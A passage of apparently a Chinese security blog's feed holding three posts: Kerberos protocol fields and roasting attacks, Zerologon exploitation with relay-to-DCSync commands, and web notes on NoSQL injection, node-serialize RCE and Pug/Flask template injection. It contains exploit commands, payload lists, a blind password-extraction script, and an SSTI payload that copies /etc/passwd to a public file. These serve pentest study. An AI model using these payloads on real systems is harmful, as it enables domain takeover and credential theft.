href="#字段-2" class="headerlink" title="字段"></a>字段</h4><ul><li><p><strong><em>msg-type</em></strong>：类型，TGSREQ对应的就是KRBTGS_REQ(0x0c)</p></li><li><p><strong><em>PA-DATA</em></strong>：认证信息</p><ul><li><p><strong><em>AP_REQ</em></strong></p><p>上一轮请求获得的TGT票据</p></li><li><p><strong><em>PAFORUSER</em></strong></p><p>请求类型：S4U2SELF,值为请求用户的用户名</p></li><li><p><strong><em>PAPACOPTIONS</em></strong>：</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs isbl">包含标记位如下：<br><br>— <span class="hljs-function"><span class="hljs-title">Claims</span>(<span class="hljs-number">0</span>)</span><br><br>— <span class="hljs-variable">Branch</span> <span class="hljs-function"><span class="hljs-title">Aware</span>(<span class="hljs-number">1</span>)</span><br><br>— <span class="hljs-variable">Forward</span> <span class="hljs-variable">to</span> <span class="hljs-variable">Full</span> <span class="hljs-function"><span class="hljs-title">DC</span>(<span class="hljs-number">2</span>)</span><br><br>— <span class="hljs-variable">Resource</span>-<span class="hljs-variable">based</span> <span class="hljs-variable">Constrained</span> <span class="hljs-variable">Delegation</span> (<span class="hljs-number">3</span>)<br></code></pre></td></tr></table></figure><p>基于资源的约束委派需要指定Resource-based Constrained Delegation位</p></li></ul></li><li><p><strong><em>REQ_BODY</em></strong></p><ul><li><p><strong><em>sname</em></strong></p><p>请求的服务名（返回的tgs是使用服务用户的hash进行加密的）</p></li><li><p><strong><em>AddtionTicket</em></strong></p><p>附加票据，约束委派时，需要正常的TGT以及S4Uself获得的TGS，TGS存入additionticket</p></li></ul></li></ul><h2 id="TGS-REP"><a href="#TGS-REP" class="headerlink" title="TGS_REP"></a>TGS_REP</h2><h4 id="字段-3"><a href="#字段-3" class="headerlink" title="字段"></a>字段</h4><ul><li><p><strong><em>msg-type</em></strong>：ASREQ的响应body对应的就是KRBTGS_REQ(0x0d)</p></li><li><p><strong><em>ticket</em></strong>：和APREQ返回的ticket很像，使用服务用户的hash加密</p></li><li><p><strong><em>enc_part</em></strong>：可解密，密钥为AS_REP返回的session_key，得到encryptionkey，其中包含另一个session_key，作为下一个阶段的密钥</p></li></ul><h2 id="S4U2SELF"><a href="#S4U2SELF" class="headerlink" title="S4U2SELF"></a>S4U2SELF</h2><p>S4U2self 使得服务可以代表用户获得针对服务自身的kerberos服务票据。这使得服务可以获得用户的授权( 可转发 的用户TGS票据)，然后将其用于后期的认证(主要是后期的s4u2proxy)，这是为了在用户以不使用 Kerberos 的方式对服务进行身份验证的情况下使用</p><p><img src="https://p3.ssl.qhimg.com/t01a4905b7404536e37.png" alt="img"></p><ul><li><p>条件：服务拥有自己的tgt</p></li><li><p>前文的 <strong><em>PAFORUSER</em></strong> 类型为S4U2SELF，*<strong>cname*** 与 *</strong>snmae*** 都为服务名。若服务请求了可转发，则当</p><ul><li>TGT可转发</li><li>服务配置了约束委派</li></ul><p>时，TGS设置可转发字段。</p></li><li><p>若用户设置了不允许委派，则S4U2SELF返回的票据是永远不可转发的。</p></li></ul><h2 id="S4U2PROXY"><a href="#S4U2PROXY" class="headerlink" title="S4U2PROXY"></a>S4U2PROXY</h2><p>使得服务1可以使用返回的ST代表用户请求服务2的ST并访问该服务</p><p><img src="https://p3.ssl.qhimg.com/t01e47d53e86539dc74.png" alt="img"></p><ul><li>如前文所述将st放入additionkey</li><li>在请求的kdc-options中设置CNAME-IN-ADDL-TKT标志</li><li>同样需要请求可转发</li><li>sname为服务2的spn</li><li>若additionkey的票据不可转发但是服务1配置了对服务2的基于资源的约束委派，返回的票据依然可转发（<code>PA-PAC-OPTION</code>设置了<code>Resource-Based Constrained Delegation</code>标志位）</li></ul><h2 id="安全问题"><a href="#安全问题" class="headerlink" title="安全问题"></a>安全问题</h2><h3 id="pth-ptk"><a href="#pth-ptk" class="headerlink" title="pth/ptk"></a>pth/ptk</h3><p>在进行认证的时候，是用用户hash加密时间戳，即使在使用密码进行登录的情况下，也是先把密码加密成hash，再进行认证。因此在只有用户hash，没有明文密码的情况下也是可以进行认证的。不管是rubeus还是impacket里面的相关脚本都是支持直接使用hash进行认证。其中，如果hash的ntlm hash，然后加密方式是rc4，这种就算做是pass the hash，如果是hash是aes key(使用 <code>sekurlsa::ekeys</code> 导出来)，就算是pass the key。在很多地方，不支持rc4加密方式的时候，使用pass the key不失为一种好方法。</p><h3 id="用户名枚举"><a href="#用户名枚举" class="headerlink" title="用户名枚举"></a>用户名枚举</h3><p>因为在req包中当cname字段的用户名存在与否所对应的返回值是不同的，故可用以枚举用户名</p><p>用户名存在：</p><p><img src="https://p0.ssl.qhimg.com/t01b3b9fcecc1102f54.png" alt="img"></p><p>用户名不存在：</p><p><img src="https://p1.ssl.qhimg.com/t014d15fa8f84842e32.png" alt="img"></p><h3 id="AS-REPROASTING"><a href="#AS-REPROASTING" class="headerlink" title="AS_REPROASTING"></a>AS_REPROASTING</h3><p>域用户如果设置了选项”Do not require Kerberos preauthentication”，此时向域控制器的88端口发送ASREQ请求，对收到的ASREP内容(enc-part底下的ciper，因为这部分是使用用户hash加密session-key，我们通过进行离线爆破就可以获得用户hash)重新组合，能够拼接成”Kerberos 5 AS-REP etype 23”(18200)的格式，接下来可以使用hashcat对其破解，最终获得该用户的明文口令</p><p><img src="https://p2.ssl.qhimg.com/t01dfeb37003dd65380.png" alt="img"></p><p>获取AS_REP里面enc-part部分里面的ciper，然后组装成前面32位16进制字符+$+后面的16进制字符得到repHash,然后format(“$krb5asrep$23${0}@{1}:{2}”, userName, domain, repHash)得到字符串，交给hashcat 破解就行</p><h3 id="黄金票据"><a href="#黄金票据" class="headerlink" title="黄金票据"></a>黄金票据</h3><p>这就没啥好说的了吧</p><h3 id="ptt"><a href="#ptt" class="headerlink" title="ptt"></a>ptt</h3><p>通过票据传递来通过身份认证</p><h3 id="kerberoasting"><a href="#kerberoasting" class="headerlink" title="kerberoasting"></a>kerberoasting</h3><p>TGSREP返回的ticket是通过服务用户的hashs加密的，因此可以通过爆破获得服务用户的口令。而当用户向kdc请求ST时，只要TGT正确，无论用户是否有访问服务的权限，都会返回ST。因此可通过此方法爆破服务用户的口令</p><ul><li>TGSREQ 的 sname 为spn</li><li>然后按照format(“$krb5tgs${0}$<em>{1}${2}${3}</em>${4}${5}”, encType, userName, domain, spn, cipherText.Substring(0, 32), cipherText.Substring(32))就可以拼接处hash cat(13100)能跑的hash。</li></ul><h3 id="白银票据"><a href="#白银票据" class="headerlink" title="白银票据"></a>白银票据</h3><p>也没什么好说的吧</p><h3 id="委派"><a href="#委派" class="headerlink" title="委派"></a>委派</h3><p>详见委派的文章</p><h2 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h2><h3 id="Rubeus"><a href="#Rubeus" class="headerlink" title="Rubeus"></a>Rubeus</h3><ul><li><strong><em>as_reproast</em></strong>：<code>rubeus.exe asreproast</code></li></ul><h3 id="impacket"><a href="#impacket" class="headerlink" title="impacket"></a>impacket</h3><ul><li><p><strong><em>GetNPUsers.py</em></strong>：查找设置不需要预认证的用户并列出tgt</p><p><img src="https://p1.ssl.qhimg.com/t01f189332af6e09202.png" alt="img"></p></li></ul><h3 id="KERBEROAST"><a href="#KERBEROAST" class="headerlink" title="KERBEROAST"></a>KERBEROAST</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 导出spn</span><br>&gt; setspn  -Q */*  <br><br><span class="hljs-comment"># 请求票据</span><br>&gt; Add-Type -AssemblyName System.IdentityModel <br>&gt; New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList <span class="hljs-string">&quot;MSSQLSvc/sqlserver.jmu.com:1433&quot;</span> <br><br><span class="hljs-comment"># 导出票据</span><br>mimikatz <span class="hljs-string">&quot;kerberos::list /export&quot;</span> <br><br><span class="hljs-comment"># 爆破</span><br>&gt; python tgsrepcrack.py wordlist.txt 1-MSSQLSvc~sql01.medin.local~1433-MYDOMAIN.LOCAL.kirbi<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>AD</category>
      
    </categories>
    
    
    <tags>
      
      <tag>AD</tag>
      
      <tag>Protocol</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>zerologon以及另一种利用方式</title>
    <link href="/2021/02/03/cve-2020-1472/"/>
    <url>/2021/02/03/cve-2020-1472/</url>
    
    <content type="html"><![CDATA[<h1 id="zerologon以及另一种利用方式"><a href="#zerologon以及另一种利用方式" class="headerlink" title="zerologon以及另一种利用方式"></a>zerologon以及另一种利用方式</h1><h3 id="cve-2020-1472：Netlogon远程提权漏洞。"><a href="#cve-2020-1472：Netlogon远程提权漏洞。" class="headerlink" title="cve-2020-1472：Netlogon远程提权漏洞。"></a>cve-2020-1472：Netlogon远程提权漏洞。</h3><p>netlogon是微软提供的另一种认证方式，不同于kerberos或ntlm。</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-bullet">1.</span> 客户端发送一个质询随机数<br><span class="hljs-bullet">2.</span> 服务器（dc）也发送一个质询随机数<br><span class="hljs-bullet">3.</span> 将两个随机数拼接，使用KDF算法加密生成session<span class="hljs-emphasis">_key。（secret对应用户hash）</span><br><span class="hljs-emphasis">4. 用户发送使用AES-CFB8加密的用户随机数（session_</span>key作为密钥）<br><span class="hljs-bullet">5.</span> 服务端发送使用AES-CFB8加密的服务端随机数（session<span class="hljs-emphasis">_key作为密钥）</span><br><span class="hljs-emphasis">6. 验证</span><br></code></pre></td></tr></table></figure><p>由于微软错误的将IV值置为全零，而client_challenge可控，当攻击者将client_challenge置为全零，可有1/256的概率使发送的密文全零。成功碰撞。</p><p>成功认证后通过nrpc将域控机器hash置空。</p><p>exp：<a href="https://github.com/dirkjanm/CVE-2020-1472">https://github.com/dirkjanm/CVE-2020-1472</a></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">python3</span> cve-<span class="hljs-number">2020</span>-<span class="hljs-number">1472</span>.py dc<span class="hljs-number">01</span>$ <span class="hljs-number">192.168.204.136</span><br></code></pre></td></tr></table></figure><p>注：需要利用 <a href="https://github.com/SecureAuthCorp/impacket/edit/master/impacket/dcerpc/v5/nrpc.py">https://github.com/SecureAuthCorp/impacket/edit/master/impacket/dcerpc/v5/nrpc.py</a> 文件替换本机上的nrpc文件。本机nrpc文件存储路径为：</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">C:<span class="hljs-symbol">\U</span>sers<span class="hljs-symbol">\A</span>dministrator<span class="hljs-symbol">\A</span>ppData<span class="hljs-symbol">\L</span>ocal<span class="hljs-symbol">\P</span>rograms<span class="hljs-symbol">\P</span>ython<span class="hljs-symbol">\P</span>ython38<span class="hljs-symbol">\L</span>ib<span class="hljs-symbol">\s</span>ite-packages<span class="hljs-symbol">\i</span>mpacket<span class="hljs-symbol">\d</span>cerpc<span class="hljs-symbol">\v</span>5<span class="hljs-symbol">\n</span>rpc.py<br></code></pre></td></tr></table></figure><hr><h3 id="Zerologon-的另一种利用方式"><a href="#Zerologon-的另一种利用方式" class="headerlink" title="Zerologon 的另一种利用方式"></a>Zerologon 的另一种利用方式</h3><p><strong><em>zerologon</em></strong>确实是2020年甚至是近年来微软爆出的最具有震撼性的漏洞，它的利用条件仅仅是可以和域控直接连通（当然域控要开放服务且未修补这个漏洞），但是这个漏洞的利用将会导致域控制器机器账户的密码被更改，其实是非常冒险的，而且一旦域控重启将导致整个域环境的崩溃，这很不符合APT的宗旨！虽然可以通过sam文件恢复原口令，但是操作起来又过于繁琐，并且有失败风险，所以本文将会讨论一种新的利用方式</p><h4 id="netlogon"><a href="#netlogon" class="headerlink" title="netlogon"></a>netlogon</h4><p>在域环境中主流的两种认证方式为kerberos和ntlm，kerberos基于三方认证，而ntlm则是集中式的认证方式，众所周知，ntlm采用质询响应式认证，由用户的nthash加密质询内容作为响应，而服务本身并不拥有用户的hash，所以会将用户的响应转发至域控制器，而转发用到的协议正是netlogon协议。</p><h4 id="签名与中继"><a href="#签名与中继" class="headerlink" title="签名与中继"></a>签名与中继</h4><p>又是众所周知，ntlm有一个著名的利用方式叫做ntlm中继，因为大部分的认证基于smb协议，所以微软引入了smb签名机制来抵御中继攻击，现在大多数的smb认证都是强制签名的，我们可以先来了解一下签名机制的细节，签名以及加密的密钥是基于用户的nthash以及一些协商细节制作的，因此这只能在域控上进行：</p><p><img src="https://dirkjanm.io/assets/img/zerologon/netlogon.svg" alt="Netlogon流"></p><p>而通过 <a href="https://www.coresecurity.com/core-labs/advisories/windows-pass-through-authentication-methods-improper-validation">cve-2015-0005</a> ，允许任意机器用户请求会话密钥，以此将身份验证中继到需要签名的地方。如果结合zerologon漏洞，我们就可以在未拥有域凭证的情况下，获得合法的签名。换而言之，任何可以进行ntlm身份验证的服务或者功能，都将变为潜在的攻击点。</p><h4 id="DCSYNC"><a href="#DCSYNC" class="headerlink" title="DCSYNC"></a>DCSYNC</h4><p>当我们可以进行中继的时候，我们会中继到什么服务上呢，那当然是最高权限角色域控制器所拥有的DRSUAPI，域控可以通过DRSUAPI同步域内的ntds数据库。原本的 cve-2020-1472 就是利用重置域控口令，来获得dcsync的权限，而当我们可以进行中继攻击的时候，我们就可以直接将身份认证中继到DRSUAPI协议，而zerologon帮助我们解决了签名的问题。</p><h4 id="攻击流程和条件"><a href="#攻击流程和条件" class="headerlink" title="攻击流程和条件"></a>攻击流程和条件</h4><ul><li>我们利用 “打印机错误漏洞” 获取域控的身份认证</li><li>通过zerologon绕过身份认证生成会话密钥</li><li>中继身份认证到DRSUAPI进行Dcsync</li></ul><p>利用条件：</p><ul><li>后台打印程序服务应在DC上运行</li><li>DC应该容易受到Zerologon的攻击</li><li>DC应该能够连接到攻击者工作站，并且不会被防火墙阻止</li><li>您应该能够运行Python并绑定到端口445以进行传入的SMB连接（在Windows上这很棘手）</li><li>域中至少应有2个DC，因为无法中继回同一DC</li></ul><p><img src="https://dirkjanm.io/assets/img/zerologon/zerologon_sploit.svg" alt="中继攻击图"></p><h4 id="实际利用"><a href="#实际利用" class="headerlink" title="实际利用"></a>实际利用</h4><p>该攻击的代码已经整合到 <a href="https://github.com/SecureAuthCorp/impacket">impacket</a> 工具包</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 执行smb中继</span><br>ntlmrelayx.py -t DCSYNC://dc.test.local -smb2support <br><br><span class="hljs-comment"># 触发打印机漏洞</span><br>printerbug.py <span class="hljs-built_in">test</span>/user:pass@dc2.test.local 192.168.11.22(攻击者ip)<br></code></pre></td></tr></table></figure><p><img src="https://dirkjanm.io/assets/img/zerologon/relaying.png" alt="中继命令设置"></p><p><img src="https://dirkjanm.io/assets/img/zerologon/relayresult.png" alt="DCSync攻击"></p>]]></content>
    
    
    <categories>
      
      <category>AD</category>
      
    </categories>
    
    
    <tags>
      
      <tag>AD</tag>
      
      <tag>Exp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>杂文1</title>
    <link href="/2021/02/03/%E6%9D%82%E6%96%871/"/>
    <url>/2021/02/03/%E6%9D%82%E6%96%871/</url>
    
    <content type="html"><![CDATA[<h1 id="NOTE-2020-3-5"><a href="#NOTE-2020-3-5" class="headerlink" title="NOTE-2020/3/5"></a>NOTE-2020/3/5</h1><h2 id="nosql注入"><a href="#nosql注入" class="headerlink" title="nosql注入"></a>nosql注入</h2><p><code>[&#123;&quot;$gt&quot;:&quot;&quot;&#125;]</code> 大于NULL（恒等）相当于 <code>or 1=1</code> </p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs gams">(&gt;)大于 - <span class="hljs-symbol">$</span><span class="hljs-keyword">gt</span><br>(&lt;)小于 - <span class="hljs-symbol">$</span><span class="hljs-keyword">lt</span><br>(&gt;=)大于等于 - <span class="hljs-symbol">$</span>gte<br>(&lt;=)小于等于 - <span class="hljs-symbol">$</span>lte<br>(!=)不等于 - <span class="hljs-symbol">$</span><span class="hljs-keyword">ne</span><br><br>(re)正则 - <span class="hljs-symbol">$</span>regex<br></code></pre></td></tr></table></figure><ul><li>e.g.:<ul><li>客户端POST数据格式为json： <code>&#123; &quot;用户名&quot;：&quot;admin&quot;，&quot;密码&quot;: &quot;GuessingAdminPassword&quot; &#125;</code></li><li>服务端逻辑： <code>db.collection(collection).find(&#123;&quot;username&quot;:username,&quot;password&quot;:password&#125;).limit(1)</code></li><li>注入： <code>&#123;&quot;username&quot;：&quot;admin&quot;，&quot;password&quot;：&#123;&quot;$gt&quot;：&quot;&quot;&#125;</code></li><li>qs 模块： 允许在参数中使用括号表示。 <code>username[value] = admin&amp;password [value] = admin</code> ===&gt; <code>&#123;&quot;username&quot;：&#123;&quot;value&quot;：&quot;admin&quot;&#125;，&quot;password&quot;：&#123;&quot;value&quot;：&quot;admin&quot; &#125;&#125;</code><ul><li>payload: <code>username=admin&amp;password[$gt]=</code></li><li>服务端请求json： <code>&#123;&quot;username&quot;: &quot;admin&quot;, &quot;password&quot;:&#123;&quot;$gt&quot;:&quot;&quot;&#125;</code></li></ul></li></ul></li><li>payload:<blockquote><p><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection</a></p></blockquote><ul><li>绕过基础认证：<code>username[$ne]=toto&amp;password[$ne]=toto</code></li><li>长度提取：<code>username[$ne]=toto&amp;password[$regex]=.&#123;3&#125;</code> 长度为3</li><li>内容提取：<code>username[$ne]=toto&amp;password[$regex]=md.&#123;1&#125;</code> // <code>username[$ne]=toto&amp;password[$regex]=m.*</code></li><li>blind:  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> urllib3<br><span class="hljs-keyword">import</span> string<br><span class="hljs-keyword">import</span> urllib<br>urllib3.disable_warnings()<br><br>username=<span class="hljs-string">&quot;admin&quot;</span><br>password=<span class="hljs-string">&quot;&quot;</span><br>u=<span class="hljs-string">&quot;http://example.org/login&quot;</span><br>headers=&#123;<span class="hljs-string">&#x27;content-type&#x27;</span>: <span class="hljs-string">&#x27;application/json&#x27;</span>&#125;<br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> string.printable:<br>        <span class="hljs-keyword">if</span> c <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> [<span class="hljs-string">&#x27;*&#x27;</span>,<span class="hljs-string">&#x27;+&#x27;</span>,<span class="hljs-string">&#x27;.&#x27;</span>,<span class="hljs-string">&#x27;?&#x27;</span>,<span class="hljs-string">&#x27;|&#x27;</span>]:<br>            payload=<span class="hljs-string">&#x27;&#123;&quot;username&quot;: &#123;&quot;$eq&quot;: &quot;%s&quot;&#125;, &quot;password&quot;: &#123;&quot;$regex&quot;: &quot;^%s&quot; &#125;&#125;&#x27;</span> % (username, password + c)<br>            r = requests.post(u, data = payload, headers = headers, verify = <span class="hljs-literal">False</span>, allow_redirects = <span class="hljs-literal">False</span>)<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;OK&#x27;</span> <span class="hljs-keyword">in</span> r.text <span class="hljs-keyword">or</span> r.status_code == <span class="hljs-number">302</span>:<br>                print(<span class="hljs-string">&quot;Found one more char : %s&quot;</span> % (password+c))<br>                password += c<br></code></pre></td></tr></table></figure></li><li>MongoDB Payloads:  <figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs xquery">true, <span class="hljs-variable">$where:</span> <span class="hljs-string">&#x27;1 == 1&#x27;</span><br>, <span class="hljs-variable">$where:</span> <span class="hljs-string">&#x27;1 == 1&#x27;</span><br><span class="hljs-variable">$where:</span> <span class="hljs-string">&#x27;1 == 1&#x27;</span><br><span class="hljs-string">&#x27;, $where: &#x27;</span><span class="hljs-number">1</span> == <span class="hljs-number">1</span><span class="hljs-string">&#x27;</span><br><span class="hljs-string">1, $where: &#x27;</span><span class="hljs-number">1</span> == <span class="hljs-number">1</span><span class="hljs-string">&#x27;</span><br><span class="hljs-string">&#123; $ne: 1 &#125;</span><br><span class="hljs-string">&#x27;</span>, <span class="hljs-variable">$or:</span> [ &#123;&#125;, &#123; <span class="hljs-string">&#x27;a&#x27;</span>:<span class="hljs-string">&#x27;a</span><br><span class="hljs-string">&#x27;</span> &#125; ], <span class="hljs-variable">$comment:</span><span class="hljs-string">&#x27;successful MongoDB injection&#x27;</span><br>db.injection.<span class="hljs-keyword">insert</span>(&#123;success:<span class="hljs-number">1</span>&#125;);<br>db.injection.<span class="hljs-keyword">insert</span>(&#123;success:<span class="hljs-number">1</span>&#125;);<span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;db.stores.mapReduce(<span class="hljs-keyword">function</span>() &#123; &#123; emit(<span class="hljs-number">1</span>,<span class="hljs-number">1</span><br>|| <span class="hljs-number">1</span>==<span class="hljs-number">1</span><br><span class="hljs-string">&#x27; &amp;&amp; this.password.match(/.*/)//+%00</span><br><span class="hljs-string">&#x27;</span> &amp;&amp; this.passwordzz.match(/.*/)//+<span class="hljs-meta">%00</span><br><span class="hljs-string">&#x27;%20%26%26%20this.password.match(/.*/)//+%00</span><br><span class="hljs-string">&#x27;</span><span class="hljs-meta">%20</span><span class="hljs-meta">%26</span><span class="hljs-meta">%26</span><span class="hljs-meta">%20this</span>.passwordzz.match(/.*/)//+<span class="hljs-meta">%00</span><br>&#123;<span class="hljs-variable">$gt:</span> <span class="hljs-string">&#x27;&#x27;</span>&#125;<br>[<span class="hljs-variable">$ne</span>]=<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><blockquote><p><a href="https://blog.websecurify.com/2014/08/hacking-nodejs-andmongodb.html">https://blog.websecurify.com/2014/08/hacking-nodejs-andmongodb.html</a><br><a href="https://www.owasp.org/index.php/Testing_for_NoSQL_injection">https://www.owasp.org/index.php/Testing_for_NoSQL_injection</a></p></blockquote></li></ul></li></ul><h2 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h2><ul><li>序列化： 序列化常用于生成值/数据的可存储表示而不会丢失其类型或结构。序列化将对象转换为字节流，以通过网络传输或存储。通常，转换方法涉及 XML，JSON 或特定于该语言的序列化方法。</li><li>e.g. : <ul><li><em>serialize.js</em> : <a href="https://github.com/luin/serialize">https://github.com/luin/serialize</a></li><li>step 1:<ul><li>全局搜索 <code>eval</code> ===&gt; <code>obj[key] = eval(&#39;(&#39; + obj[key].substring(FUNCFLAG.length) + &#39;)&#39;);</code></li></ul></li><li>step2:<ul><li>构建反序列化对象： <code>&#123;“thp”:“_$$ND_FUNC$$_function ()&#123;require(‘child_process’).exec(‘DO SYSTEM COMMANDS HERE’,function(error, stdout, stderr) &#123; console.log(stdout) &#125;);&#125;()”&#125;</code></li></ul></li><li>参考文献：<blockquote><p><a href="https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/">https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/</a></p></blockquote></li></ul></li></ul><h2 id="模板注入"><a href="#模板注入" class="headerlink" title="模板注入"></a>模板注入</h2><ul><li><p>模板：将静态部分糅合，操作方便，不用手写静态结构。可实现代码化。</p></li><li><p>模板注入是指用户输入直接传递到渲染模板，允许修改底层模板。</p></li><li><p>检测：检查我们提供的输入参数是否可以处理基本操作</p><ul><li>关于攻击模板和与底层模板系统交互：<blockquote><p><a href="http://ubm.io/2ECTYSi">http://ubm.io/2ECTYSi</a></p></blockquote></li></ul></li><li><p><strong>一句话：破坏模板结构，使输入进入模板底层并执行。</strong></p></li><li><p>Pug模板注入：</p><ul><li><p>%0a - 换行符，破坏输入结构，进入底层</p></li><li><p>%3d - 编码”=”,pug系统等号输出js执行结果</p></li><li><p>e.g. : 构造 <code>GET /ti?user=%0a%3d9*9</code> 输出为81</p></li><li><p>攻击步骤：</p><ol><li>访问全局：<code>%0a%3d%20%67%6c%6f%62%61%6c</code> ==&gt; <code>%0a%3d globa</code></li><li>使用each迭代器查找可访问的对象： <code>%65%61%63%68%20%76%61%6c%2c%69%6e%64%65%78%20%69%6e%67%6c%6f%62%61%6c%20%70%3d%69%6e%64%65%78</code> ==&gt; <code>each val,index inglobal p=index</code></li><li>目的：寻找到包含require方法的对象。<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> x = <span class="hljs-built_in">global</span>.process.mainModule.require<br>x(<span class="hljs-string">&#x27;child_process&#x27;</span>).exec(<span class="hljs-string">&#x27;cat / etc / passwd &gt;&gt;/opt/web/chatSupportSystems/public/       accounts.txt&#x27;</span>)<br></code></pre></td></tr></table></figure></li></ol></li><li><p>工具：tplmap　==&gt;　<code>./tplmap.py -u &quot;http://chat:3000/ti?user=*&amp;comment=asdfasdf&amp;link=</code></p><blockquote><p>　<a href="https://github.com/epinna/tplmap">https://github.com/epinna/tplmap</a></p></blockquote></li></ul></li><li><p>flask模板注入</p><ul><li><p>flask基础 </p><ul><li><p>路由：</p>  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> flask <br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/index/&#x27;</span></span>)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">hello_word</span>():</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;hello word&#x27;</span><br></code></pre></td></tr></table></figure><p>  router装饰器将函数与url连接起来，当访问 <code>http://127.0.0.1/index</code>　时返回　<code>hello word</code></p></li><li><p>渲染：</p><ul><li><p>render_template : 渲染指定文件</p><p>  <code>return render_template(&#39;index.html&#39;)</code></p></li><li><p>render_template_string : 渲染字符串（SSTI与他有关）</p>  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">html = <span class="hljs-string">&#x27;&lt;h1&gt;This is index page&lt;/h1&gt;&#x27;</span><br><span class="hljs-keyword">return</span> render_template_string(html)<br></code></pre></td></tr></table></figure></li></ul></li><li><p>模板：</p><ul><li>根目录下的 <code>templates</code> 文件夹存放html文件</li><li>模板支持调用模板函数来传参：<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># test.py</span><br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask,url_for,redirect,render_template,render_template_string<br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/index/&#x27;</span></span>)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">user_login</span>():</span><br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;index.html&#x27;</span>,content=<span class="hljs-string">&#x27;This is index page.&#x27;</span>)<br></code></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs html"># /templates/index.html<br><span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>&#123;&#123;content&#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br></code></pre></td></tr></table></figure>模板文件中用<code>&#123;&#123;&#125;&#125;`包裹变量    * flask模板注入：        + 